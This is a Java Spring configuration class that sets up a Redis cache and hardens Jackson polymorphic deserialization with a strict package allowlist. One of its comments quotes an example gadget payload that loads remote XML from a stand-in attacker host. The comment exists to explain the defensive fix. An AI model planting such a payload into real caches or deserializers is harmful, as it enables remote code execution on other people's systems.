package com.operativus.agentmanager.control.config;

import org.springframework.beans.factory.annotation.Value;
import org.springframework.boot.autoconfigure.condition.ConditionalOnProperty;
import org.springframework.cache.annotation.CachingConfigurer;
import org.springframework.cache.annotation.EnableCaching;
import org.springframework.cache.interceptor.CacheErrorHandler;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.data.redis.cache.RedisCacheConfiguration;
import org.springframework.data.redis.cache.RedisCacheManager;
import org.springframework.data.redis.connection.RedisConnectionFactory;
import org.springframework.data.redis.serializer.GenericJackson2JsonRedisSerializer;
import org.springframework.data.redis.serializer.RedisSerializationContext;
import org.springframework.data.redis.serializer.StringRedisSerializer;

import com.fasterxml.jackson.annotation.JsonTypeInfo;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.jsontype.BasicPolymorphicTypeValidator;
import com.fasterxml.jackson.databind.jsontype.PolymorphicTypeValidator;
import com.fasterxml.jackson.datatype.jsr310.JavaTimeModule;

import java.time.Duration;

/**
 * Domain Responsibility: Configures the distributed caching layer using Redis.
 * State: Stateless (Configuration)
 */
@Configuration
@EnableCaching
public class CacheConfig implements CachingConfigurer {

    /**
     * @summary Downgrades Redis failures to cache misses instead of letting them
     *     propagate as request-killing 500s.
     * @logic Default Spring policy ({@code SimpleCacheErrorHandler}) re-throws,
     *     turning every {@code @Cacheable} call into a hard Redis dependency. The
     *     {@link LoggingCacheErrorHandler} logs at WARN and returns null/void so the
     *     underlying method still runs during a Redis outage.
     */
    @Override
    public CacheErrorHandler errorHandler() {
        return new LoggingCacheErrorHandler();
    }

    /**
     * @summary Configures the Redis cache manager with specific serialization and TTL settings.
     * @logic
     * - Default TTL is 24 hours, externalized via {@code spring.cache.redis.time-to-live}
     *   (standard Spring Boot property). Integration tests set a short ISO-8601 duration
     *   (e.g. {@code PT2S}) to exercise expiry without waiting a day.
     * - Configures JSON serialization for cache values and String serialization for keys.
     * - Disables caching of null values.
     *
     * Gated on {@code spring.cache.type=redis} (default for prod) so test profiles that set
     * {@code spring.cache.type=none} fall through to Spring Boot's {@code NoOpCacheManager}
     * auto-configuration, instead of pinning a Redis-backed cache that would mask
     * tenant-scoped queries by serving stale, pre-filter cached results across requests.
     */
    /**
     * Strict allowlist used by the cache ObjectMapper's polymorphic-type machinery.
     *
     * <p><b>Why this exists.</b> Previously {@link com.fasterxml.jackson.databind.jsontype.impl.LaissezFaireSubTypeValidator}
     * was passed to {@code activateDefaultTyping} — by design that validator accepts
     * any subtype, which makes the deserializer a textbook Jackson polymorphic-deser
     * RCE sink (CVE-2017-7525 et al.). With Redis as the backing store, anyone who
     * can write to a cache key (compromised internal pod, mis-exposed Redis port,
     * indirect cache-poisoning via a {@code @Cacheable} method whose return type
     * embeds attacker-influenced fields) could plant a payload like
     * {@code ["org.springframework.context.support.ClassPathXmlApplicationContext","http://attacker/exploit.xml"]}
     * and trigger one of the well-known gadget chains on the next cache hit.
     *
     * <p><b>What the allowlist covers.</b> Every type currently routed through the
     * cache lives in one of these four base packages:
     * <ul>
     *   <li>{@code com.operativus.agentmanager.*} — our domain entities + DTOs
     *       (AgentEntity, ModelEntity, settings records, etc.)</li>
     *   <li>{@code java.util.} — Optional, List, Map, Set, Collection</li>
     *   <li>{@code java.time.} — Instant, LocalDateTime, etc. via {@link JavaTimeModule}</li>
     *   <li>{@code java.lang.} — Strings, Numbers, Booleans</li>
     * </ul>
     * The well-known gadget classes (Spring Context loaders, Hibernate, c3p0,
     * Commons-Configuration, jackson-databind itself) live in
     * {@code org.springframework.*}, {@code org.hibernate.*}, {@code com.mchange.*},
     * {@code org.apache.commons.*}, etc. — none on the allowlist, all rejected at
     * type-id resolution before any class load.
     */
    static PolymorphicTypeValidator strictCachePolymorphicTypeValidator() {
        // allowIfSubType matches the CONCRETE subtype class name declared in the JSON
        // (the gadget-control target). allowIfBaseType would match the DECLARED base
        // type, which is always Object under DefaultTyping.NON_FINAL — useless for
        // filtering attacker-controlled subtype ids.
        return BasicPolymorphicTypeValidator.builder()
                .allowIfSubType("com.operativus.agentmanager.")
                .allowIfSubType("java.util.")
                .allowIfSubType("java.time.")
                .allowIfSubType("java.lang.")
                .build();
    }

    @Bean
    @ConditionalOnProperty(prefix = "spring.cache", name = "type", havingValue = "redis", matchIfMissing = true)
    public RedisCacheManager cacheManager(
            RedisConnectionFactory connectionFactory,
            @Value("${spring.cache.redis.time-to-live:PT24H}") Duration entryTtl) {
        ObjectMapper objectMapper = new ObjectMapper();
        objectMapper.registerModule(new JavaTimeModule());
        objectMapper.activateDefaultTyping(
                strictCachePolymorphicTypeValidator(),
                ObjectMapper.DefaultTyping.NON_FINAL,
                JsonTypeInfo.As.PROPERTY
        );

        RedisCacheConfiguration config = RedisCacheConfiguration.defaultCacheConfig()
            .computePrefixWith(cacheName -> "v2:" + cacheName + "::")
            .entryTtl(entryTtl)
            .serializeKeysWith(RedisSerializationContext.SerializationPair.fromSerializer(new StringRedisSerializer()))
            .serializeValuesWith(RedisSerializationContext.SerializationPair.fromSerializer(new GenericJackson2JsonRedisSerializer(objectMapper)));

        return RedisCacheManager.builder(connectionFactory)
            .cacheDefaults(config)
            .build();
    }
}
